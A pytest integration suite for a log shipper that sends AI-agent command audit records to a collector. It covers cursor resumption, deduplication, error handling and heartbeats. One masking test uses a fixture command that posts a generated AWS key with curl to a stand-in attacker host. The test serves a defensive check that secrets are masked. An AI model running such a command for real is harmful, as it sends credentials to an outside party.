"""The shipper, against the REAL collector. Not a stub.

⚠ WHY NOT A STUB. Every failure this file exercises is a claim about what the
collector actually does — 202 on a gap, 413 on an oversized body, 507 on a full
disk, deduplication on a replay. A stub would encode what I BELIEVE the
collector does, and the belief is the thing under test. The one time a stub
would have been convenient here it would also have been wrong: the collector
refuses an oversized body WITHOUT reading it, so a large POST dies mid-upload
with a broken pipe rather than returning 413, and a stub returning a clean 413
would have hidden that the shipper must classify a broken pipe as TOO_LARGE.

⚠ THE COLLECTOR IS IMPORTED, NEVER MODIFIED. It lives in its own repo and this
file only starts it. If the checkout is absent these tests SKIP — the engine
must not require a sibling repo to run its suite.
"""
from __future__ import annotations

import json
import os
import sys
import threading
from pathlib import Path

import pytest

# A checkout of a compatible collector, named by the operator; none ships here.
COLLECTOR = Path(os.environ.get("STING_COLLECTOR_CHECKOUT") or "/nonexistent-collector-checkout")
pytestmark = pytest.mark.skipif(
    not (COLLECTOR / "collector" / "server.py").exists(),
    reason="no collector checkout named in STING_COLLECTOR_CHECKOUT")

if str(COLLECTOR) not in sys.path:
    sys.path.insert(0, str(COLLECTOR))

from core import audit_log, wire                                 # noqa: E402
from runner.known_formats_corpus import make_key                 # noqa: E402
from shipper import client, config, mask                         # noqa: E402
from shipper.run import Shipper                                  # noqa: E402

DEVICE = "laptop-test"
TOKEN = "device-token-long-enough-for-the-collector"


# --------------------------------------------------------------- the fixtures

@pytest.fixture
def collector(tmp_path):
    """The real thing, on a random loopback port."""
    from collector import config as ccfg
    from collector.auth import Tokens
    from collector.server import Collector
    from collector.store import FileStore

    store_root = tmp_path / "collector-store"
    settings = ccfg.Settings(bind_host="127.0.0.1", bind_port=0,
                             store_root=str(store_root),
                             reader_token="reader-token-long-enough")
    store = FileStore(str(store_root))
    server = Collector(settings, Tokens({DEVICE: TOKEN},
                                         "reader-token-long-enough"), store)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_address[1]}", store
    server.shutdown()
    server.server_close()


def write_log(root: Path, session: str, n: int, *, start=1, command=None):
    """Real records through the real writer, so the chain is real."""
    import os
    os.environ["STING_SESSION_ROOT"] = str(root)
    for i in range(n):
        audit_log.append(session, audit_log.build_body(
            session, seq=start + i, event="decision", decision="ALLOW",
            kind="EXEC", command=command or f"pytest -q # {start + i}",
            cwd="/work/repo", agent="claude-code", ts=1_786_000_000.0 + i,
            rule_id=None, reason=None,
            evidence=f"@0 pytest -q # {start + i}"))
    return audit_log.default_log_path(session, root)


def make_shipper(tmp_path, url, *, interval=0, records=1, ships=wire.MASKED):
    """A shipper on a machine that agreed to what ships (`STING_SHIPS`), unless
    a test says otherwise: without the agreement it holds every record."""
    settings = config.Settings(
        collector_url=url, device_token=TOKEN, device_id=DEVICE, ships=ships,
        log_root=tmp_path / "logs", state_root=tmp_path / "state",
        flush_seconds=interval, flush_records=records, timeout_seconds=10.0)
    shipper = Shipper(settings, log=lambda *a: None)
    return shipper


# ------------------------------------------------------------ the happy path

def test_a_session_ships_and_the_cursor_advances(collector, tmp_path):
    url, store = collector
    write_log(tmp_path / "logs", "sess-aaaa", 5)
    shipper = make_shipper(tmp_path, url)

    assert shipper.pending() == 5
    shipper.tick()

    assert shipper.pending() == 0
    position = shipper.cursor.get("sess-aaaa")
    assert position.shipped == 5
    assert position.last_seq == 5
    assert store.head(DEVICE, "sess-aaaa").record_count == 5


def test_a_second_pass_ships_only_what_is_new(collector, tmp_path):
    url, store = collector
    write_log(tmp_path / "logs", "sess-bbbb", 3)
    shipper = make_shipper(tmp_path, url)
    shipper.tick()

    write_log(tmp_path / "logs", "sess-bbbb", 4, start=4)
    shipper._last_flush = 0
    shipper.tick()

    assert store.head(DEVICE, "sess-bbbb").record_count == 7
    # ⚠ CONTINUITY ACROSS BATCHES: no gap was reported, which is the collector
    # confirming that `continues_from` matched what it held.
    from collector.report import session_report
    assert session_report(store, DEVICE, "sess-bbbb")["chain_continuous"] is True


# ------------------------------------------------------- 1.2 · the cursor

def test_the_cursor_survives_a_restart(collector, tmp_path):
    """⚠ CLOSED LAPTOP, DEAD WIFI, KILLED PROCESS — all the same test. A fresh
    Shipper object reading the same state directory must resume, not re-ship."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-cccc", 4)
    make_shipper(tmp_path, url).tick()

    reborn = make_shipper(tmp_path, url)
    assert reborn.pending() == 0
    assert reborn.cursor.get("sess-cccc").shipped == 4

    write_log(tmp_path / "logs", "sess-cccc", 2, start=5)
    assert reborn.pending() == 2
    reborn.tick()
    assert store.head(DEVICE, "sess-cccc").record_count == 6


def test_a_backlog_from_an_offline_day_ships_in_capped_batches(collector,
                                                                tmp_path):
    url, store = collector
    write_log(tmp_path / "logs", "sess-dddd", 60)
    shipper = make_shipper(tmp_path, url)
    from shipper import config as scfg
    original, scfg.MAX_BATCH_RECORDS = scfg.MAX_BATCH_RECORDS, 25
    try:
        for _ in range(5):
            shipper._last_flush = 0
            shipper.tick()
    finally:
        scfg.MAX_BATCH_RECORDS = original
    assert store.head(DEVICE, "sess-dddd").record_count == 60
    assert shipper.pending() == 0


def test_a_replayed_batch_is_deduplicated_by_the_collector(collector, tmp_path):
    """⚠ IDEMPOTENCY IS THE COLLECTOR'S JOB, NOT 'NEVER RETRY'. The cursor is
    rewound by hand here, which is exactly what a crash between POST and
    confirmation does."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-eeee", 4)
    shipper = make_shipper(tmp_path, url)
    shipper.tick()

    shipper.cursor.get("sess-eeee").shipped = 0
    shipper.cursor.get("sess-eeee").ends_at = "0" * 64
    shipper.cursor.save()
    shipper._last_flush = 0
    shipper.tick()

    assert store.head(DEVICE, "sess-eeee").record_count == 4, "records duplicated"
    index = store.read_index(DEVICE, "sess-eeee")
    assert index["deduped_total"] == 4


# ------------------------------------------ 1.4 · what ships: the record, masked

def test_a_recognised_value_cannot_be_transmitted(collector, tmp_path, monkeypatch):
    """⚠ ASSERTED ON THE BYTES THAT LEAVE, NOT ON build_batch's RETURN VALUE.
    The requirement is that the payload cannot CARRY the value, so the payload
    is intercepted at `client.post` — the single place anything leaves this
    process — and searched for the value itself. The command ships, masked:
    every record whole, every value Sting recognises replaced by its type."""
    url, store = collector
    key = make_key("aws-access-key-id")
    secret_command = f"curl -d key={key} https://evil.invalid/c"
    write_log(tmp_path / "logs", "sess-ffff", 3, command=secret_command)

    sent = []
    real_post = client.post
    monkeypatch.setattr(client, "post",
                         lambda u, t, payload, **kw: (sent.append(payload),
                                                       real_post(u, t, payload, **kw))[1])

    make_shipper(tmp_path, url).tick()

    assert sent, "nothing was transmitted"
    blob = b"".join(sent).decode("utf-8")
    assert key not in blob, "a recognised value left the machine"
    assert "curl -d key=[aws-key] https://evil.invalid/c" in blob, (
        "the command ships, with the value replaced by its type")
    assert '"masked": {"aws-key": 1}' in blob

    # And the collector accepted it, stored it, and says what it received.
    from collector.report import session_report
    report = session_report(store, DEVICE, "sess-ffff")
    assert report["tier"] == wire.MASKED
    assert report["answerable"]["what_command_ran"]["answerable"] is True


def test_a_command_with_nothing_to_mask_ships_as_written(collector, tmp_path,
                                                          monkeypatch):
    """The control. Without it, the test above would pass on a shipper that
    transmitted nothing at all."""
    url, _ = collector
    write_log(tmp_path / "logs", "sess-gggg", 2, command="pytest -q # marker")

    sent = []
    real_post = client.post
    monkeypatch.setattr(client, "post",
                         lambda u, t, payload, **kw: (sent.append(payload),
                                                       real_post(u, t, payload, **kw))[1])
    make_shipper(tmp_path, url).tick()
    assert "pytest -q # marker" in b"".join(sent).decode("utf-8")


def test_a_machine_that_never_agreed_sends_the_collector_nothing(collector, tmp_path):
    """An install from before 28 Sep 2026 carries no `STING_SHIPS`: every record
    stays on disk and the collector holds nothing for the session."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-held", 2)
    shipper = make_shipper(tmp_path, url, ships="")
    shipper.tick()
    assert store.head(DEVICE, "sess-held") is None
    assert shipper.pending() == 2


# ------------------------------------------------- 1.6 · the failure matrix

def test_an_unreachable_collector_loses_nothing(tmp_path):
    """Nothing listening. The port is closed, not slow."""
    write_log(tmp_path / "logs", "sess-down", 4)
    shipper = make_shipper(tmp_path, "http://127.0.0.1:1")
    shipper.tick()

    assert shipper.cursor.get("sess-down").shipped == 0, "the cursor advanced"
    assert shipper.pending() == 4, "records were dropped"
    assert shipper._backoff > 0, "no backoff was applied"


def test_a_wrong_token_backs_off_hard_and_keeps_everything(collector, tmp_path):
    url, store = collector
    write_log(tmp_path / "logs", "sess-401", 3)
    shipper = make_shipper(tmp_path, url)
    shipper.settings = config.Settings(**{**shipper.settings.__dict__,
                                           "device_token": "wrong-token-entirely"})
    shipper.tick()

    assert shipper.cursor.get("sess-401").shipped == 0
    assert shipper.pending() == 3
    assert store.sessions() == []
    # ⚠ A LONGER BACKOFF THAN "UNREACHABLE": a 401 will not fix itself, and
    # hammering it turns one wrong token into a stream of failed auth attempts.
    assert shipper._retry_after - shipper.now() > 300


def test_an_oversized_batch_is_split_rather_than_abandoned(collector, tmp_path):
    """⚠ 413 IS THE ONE FAILURE THE SHIPPER CAN FIX BY ITSELF. And the real
    collector refuses without reading, so this arrives as a broken pipe rather
    than a clean 413 — which the client classifies as TOO_LARGE precisely so
    this path is reached."""
    url, store = collector
    big = "x" * 200_000
    write_log(tmp_path / "logs", "sess-413", 60, command=big)
    shipper = make_shipper(tmp_path, url)
    for _ in range(8):
        shipper._last_flush = 0
        shipper.tick()

    assert store.head(DEVICE, "sess-413") is not None, "nothing got through"
    assert shipper.cursor.get("sess-413").shipped > 0


def test_a_single_record_too_large_is_skipped_locally_and_does_not_wedge(
        collector, tmp_path):
    """⚠ ONE UNDELIVERABLE RECORD MUST NOT KILL A SESSION. Blocking forever
    converts one lost action into a silently dead session; the loss is made
    LOCAL, EXPLICIT and bounded to one record instead.

    ⚠ AND THE FIRST VERSION OF THIS TEST COULD NOT REACH THE PATH, WHICH IS
    ITSELF THE FINDING. It appended a 9 MB command through `audit_log.append`
    and got a clean 200: `_MAX_COMMAND = 2048` clips every command before it is
    written, and `_MAX_EVIDENCE = 200` bounds the span. So a record produced by
    the hook is bounded at roughly 2.5 KB and CANNOT exceed the collector's
    8 MiB body cap — a single-record 413 is unreachable in normal operation.

    The path is still exercised, because "unreachable today" is a statement
    about today's writer: a record is written straight into the log file here,
    bypassing the clipper the way a hand-edited or future-format log would."""
    url, store = collector
    log_dir = tmp_path / "logs"
    write_log(log_dir, "sess-huge", 3, start=2)          # normal records
    path = log_dir / "sess-huge.log.jsonl"

    # Straight into the file, past `build_body`'s clipping.
    monstrous = {"ts": 1.0, "session_id": "sess-huge", "seq": 99,
                  "event": "decision", "decision": "ALLOW", "kind": "EXEC",
                  "command": "y" * 9_000_000, "cwd": "/w", "agent": "claude-code",
                  "prev": "0" * 64, "hash": "f" * 64}
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(monstrous, sort_keys=True) + "\n")

    shipper = make_shipper(tmp_path, url)
    for _ in range(8):
        shipper._last_flush = 0
        shipper.tick()

    undeliverable = tmp_path / "state" / "undeliverable.jsonl"
    assert undeliverable.exists(), "the oversized record was not recorded locally"
    noted = json.loads(undeliverable.read_text().splitlines()[0])
    assert noted["seq"] == 99
    assert shipper.cursor.get("sess-huge").shipped == 4, "the session wedged"
    assert store.head(DEVICE, "sess-huge") is not None


def test_a_hook_written_record_can_never_exceed_the_collector_s_cap(tmp_path):
    """The bound that makes the case above defensive rather than routine."""
    from core import audit_log

    write_log(tmp_path / "logs", "sess-bound", 1, command="z" * 5_000_000)
    record = audit_log.read_records(tmp_path / "logs" / "sess-bound.log.jsonl")[0]
    assert len(record["command"]) <= audit_log._MAX_COMMAND + 32
    assert record["command_clipped"] is True
    assert len(json.dumps(record)) < 8 * 1024 * 1024


def test_a_gap_is_information_and_the_cursor_advances(collector, tmp_path):
    """⚠ 202 IS NOT AN ERROR. The batch IS stored. Stalling the cursor behind a
    hole that can never fill would wedge the session forever while its log kept
    growing."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-gap", 3)
    shipper = make_shipper(tmp_path, url)
    shipper.tick()

    # A hole: records 4-6 are written and never shipped, 7-9 are.
    #
    # ⚠ MOVING `shipped` ALONE DOES NOT MAKE A GAP, which the first version of
    # this test got wrong and the collector correctly answered 200 to. The gap
    # is in `continues_from`, so `ends_at` must move to record 6's hash — the
    # digest of a record the collector was never sent.
    write_log(tmp_path / "logs", "sess-gap", 3, start=4)
    records = audit_log.read_records(tmp_path / "logs" / "sess-gap.log.jsonl")
    shipper.cursor.get("sess-gap").shipped = 6
    shipper.cursor.get("sess-gap").ends_at = records[5]["hash"]
    shipper.cursor.save()
    write_log(tmp_path / "logs", "sess-gap", 3, start=7)
    shipper._last_flush = 0
    outcome = shipper.tick()

    assert client.STORED_WITH_GAP in outcome["outcomes"]
    assert shipper.cursor.get("sess-gap").shipped == 9, "the cursor stalled"
    assert shipper.cursor.get("sess-gap").gaps == 1, "the gap was not remembered"

    from collector.report import session_report
    report = session_report(store, DEVICE, "sess-gap")
    assert report["chain_continuous"] is False
    assert report["gap_count"] == 1
    assert report["record_count"] == 6, "both sides of the gap must be held"


def _shipped_raw_then_continued(collector, tmp_path, *, bridge: bool):
    """Records 1-3 stored RAW, as a shipper from before keyed fingerprints sent
    them (an identity fingerprint gives exactly the raw `continues_from` and
    `hash` it sent); then this shipper continues the session with 4-9."""
    url, store = collector
    log = write_log(tmp_path / "logs", "sess-keyed", 3)
    records = audit_log.read_records(log)
    raw = wire.build_batch(records, device_id=DEVICE, session_id="sess-keyed",
                           mask=mask.mask_record, fingerprint=lambda value: value)
    before = client.post(f"{url}/v1/batches", TOKEN,
                         json.dumps(raw, sort_keys=True).encode("utf-8"), timeout=10)
    assert before.kind == client.STORED, "precondition: the raw batch is stored"
    shipper = make_shipper(tmp_path, url)
    position = shipper.cursor.get("sess-keyed")
    position.shipped, position.ends_at = 3, records[2]["hash"]
    position.keyed = not bridge                    # the negative control skips it
    shipper.cursor.save()
    outcomes = []
    for start in (4, 7):
        write_log(tmp_path / "logs", "sess-keyed", 3, start=start)
        shipper._last_flush = 0
        outcomes += shipper.tick()["outcomes"]
    return store, outcomes, audit_log.read_records(log)


def test_a_session_shipped_raw_continues_keyed_with_no_gap(collector, tmp_path):
    """⚠ THE SWITCH INSIDE A LIVE SESSION MUST NOT READ AS A GAP OR TAMPERING
    (keyed fingerprints, core/wire.py). The first keyed batch continues from
    the raw head the collector holds and its first record's `prev` stays raw;
    every batch after it is keyed. The real collector: no gap, one continuous
    chain, and the raw digests of records 4-9 stored nowhere."""
    from collector.report import session_report
    store, outcomes, local = _shipped_raw_then_continued(collector, tmp_path, bridge=True)
    assert client.STORED_WITH_GAP not in outcomes, outcomes
    report = session_report(store, DEVICE, "sess-keyed")
    assert report["chain_continuous"] is True and report["gap_count"] == 0
    assert report["record_count"] == 9
    stored = json.dumps(store.records(DEVICE, "sess-keyed", limit=50))
    for record in local[3:]:
        assert record["hash"] not in stored, "a raw digest of a later record was stored"


def test_without_the_bridge_the_switch_would_read_as_a_gap(collector, tmp_path):
    """The negative control: keyed from the first batch after the switch, the
    collector compares a keyed `continues_from` with the raw head it holds."""
    from collector.report import session_report
    store, outcomes, _local = _shipped_raw_then_continued(collector, tmp_path, bridge=False)
    assert client.STORED_WITH_GAP in outcomes
    assert session_report(store, DEVICE, "sess-keyed")["chain_continuous"] is False


def test_a_full_disk_on_the_collector_loses_nothing(collector, tmp_path):
    """507. Not a client error and not the batch's fault — retry, do not
    advance, do not quarantine."""
    import os

    url, store = collector
    write_log(tmp_path / "logs", "sess-507", 3)
    shipper = make_shipper(tmp_path, url)

    devices = store.root / "devices"
    devices.mkdir(parents=True, exist_ok=True)
    os.chmod(devices, 0o500)                       # writes will fail with EACCES
    try:
        shipper.tick()
        assert shipper.cursor.get("sess-507").shipped == 0
        assert shipper.pending() == 3
        assert shipper._backoff > 0
    finally:
        os.chmod(devices, 0o700)

    # And it recovers on its own once the disk is writable again.
    shipper._retry_after = 0
    shipper._last_flush = 0
    shipper.tick()
    assert store.head(DEVICE, "sess-507").record_count == 3


def test_none_of_these_raise(collector, tmp_path):
    """⚠ THE PROPERTY BEHIND ALL OF THEM. An unattended shipper that dies is a
    laptop that stops reporting without saying so — which is precisely the state
    the heartbeat exists to make visible, arrived at by the shipper itself."""
    url, _ = collector
    write_log(tmp_path / "logs", "sess-raise", 2)
    for target in (url, "http://127.0.0.1:1", "http://not-a-real-host.invalid",
                    "not-even-a-url", url + "/wrong"):
        shipper = make_shipper(tmp_path, target)
        shipper.tick()          # must simply return


# ------------------------------------------------------------ 2 · heartbeat

def test_the_heartbeat_payload_carries_what_was_asked_for(collector, tmp_path):
    """What a heartbeat carries, including what this machine ships: `masked`
    on a machine that agreed to it."""
    url, _ = collector
    write_log(tmp_path / "logs", "sess-hb", 2)
    shipper = make_shipper(tmp_path, url)
    shipper.tick()

    payload = shipper.heartbeat.payload()
    assert payload["device_id"] == DEVICE
    assert payload["guard_ref"]
    assert payload["uptime_seconds"] >= 0
    assert payload["cursor"]["sess-hb"]["shipped"] == 2
    assert payload["cursor"]["sess-hb"]["last_seq"] == 2
    assert payload["tier"] == wire.MASKED
    assert "NOT that the hook is installed" in payload["attests"]


def test_a_tier_in_the_environment_changes_nothing(collector, tmp_path, monkeypatch):
    """⚠ `STING_TIER` DECIDED WHAT A SHIPPER SENT UNTIL 28 SEP 2026, AND NOTHING
    READS IT NOW. With it unset and then set, the machine ships what it agreed
    to, and its heartbeat says so."""
    url, _ = collector
    write_log(tmp_path / "logs", "sess-default", 1)

    monkeypatch.delenv("STING_TIER", raising=False)
    assert make_shipper(tmp_path, url).heartbeat.payload()["tier"] == wire.MASKED

    monkeypatch.setenv("STING_TIER", wire.LOCATED)
    assert make_shipper(tmp_path, url).heartbeat.payload()["tier"] == wire.MASKED


def test_the_heartbeat_is_not_a_log_record_and_never_enters_the_chain(
        collector, tmp_path):
    """⚠ THE ARGUMENT IS IN heartbeat.py; THIS IS THE ASSERTION. A heartbeat
    carries no `prev` and no `hash`, so it cannot be inserted into a chain even
    by accident — and the number of records in a session stays the number of
    things that happened, rather than a function of how often a timer fired."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-chain", 3)
    shipper = make_shipper(tmp_path, url)
    shipper.tick()
    before = store.head(DEVICE, "sess-chain")

    payload = shipper.heartbeat.payload()
    assert "prev" not in payload and "hash" not in payload
    assert "seq" not in payload
    assert payload["kind"] == "heartbeat"

    shipper.heartbeat._last_sent = 0
    shipper.heartbeat.maybe_send(log=lambda *a: None)

    after = store.head(DEVICE, "sess-chain")
    assert (after.record_count, after.ends_at) == (before.record_count,
                                                    before.ends_at)


def test_the_collector_now_accepts_the_heartbeat(collector, tmp_path):
    """⚠ THIS TEST USED TO ASSERT THE OPPOSITE, AND WAS RIGHT WHEN WRITTEN. The
    gap named in docs/21-heartbeat-gap.md is closed: the collector has a
    /v1/heartbeat route and records via="heartbeat". Inverted rather than
    deleted, because the behaviour it pins — the shipper and the collector
    agreeing about liveness — is the thing that matters.

    ⚠ AND IT WAS FAILING SILENTLY FOR A WHOLE PASS. The collector was changed in
    its own repo and this repo's suite was not re-run, so a cross-repo test went
    red and nobody looked. That is what a cross-repo test is FOR."""
    url, store = collector
    write_log(tmp_path / "logs", "sess-hb2", 2)
    shipper = make_shipper(tmp_path, url)

    said = []
    shipper.heartbeat._last_sent = 0
    assert shipper.heartbeat.maybe_send(log=said.append) == client.STORED
    assert shipper.heartbeat.supported is True
    assert said == [], f"a working heartbeat warned about something: {said}"

    from collector.report import device_report
    view = device_report(store, DEVICE)
    assert view["last_heard_via"] == "heartbeat"
    assert view["heartbeat_count"] == 1
    # ⚠ THE INTERVAL IS NOW DECLARED, so staleness is computable from the FIRST
    # heartbeat instead of needing two to observe a gap.
    assert view["interval_basis"] == "declared"
    assert view["stale"] is False

    shipper._last_flush = 0
    shipper.tick()
    assert store.head(DEVICE, "sess-hb2").record_count == 2


def test_an_older_collector_without_the_route_is_still_survivable(tmp_path):
    """The 404 path is KEPT: a developer may point this at a collector older
    than the shipper, and a process that crashed or spammed there would be worse
    than one that says so once and carries on shipping batches."""
    import http.server
    import threading

    class NotFound(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            self.send_response(404)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"{}")

        def log_message(self, *a):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), NotFound)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        shipper = make_shipper(tmp_path, f"http://127.0.0.1:{server.server_address[1]}")
        said = []
        shipper.heartbeat._last_sent = 0
        assert shipper.heartbeat.maybe_send(log=said.append) == client.UNSUPPORTED
        assert shipper.heartbeat.supported is False
        assert len(said) == 1 and "no /v1/heartbeat endpoint" in said[0]

        # Once, then never again — a 404 every interval forever is noise that
        # trains the operator to ignore this process.
        shipper.heartbeat._last_sent = 0
        assert shipper.heartbeat.maybe_send(log=said.append) is None
        assert len(said) == 1
    finally:
        server.shutdown()
        server.server_close()
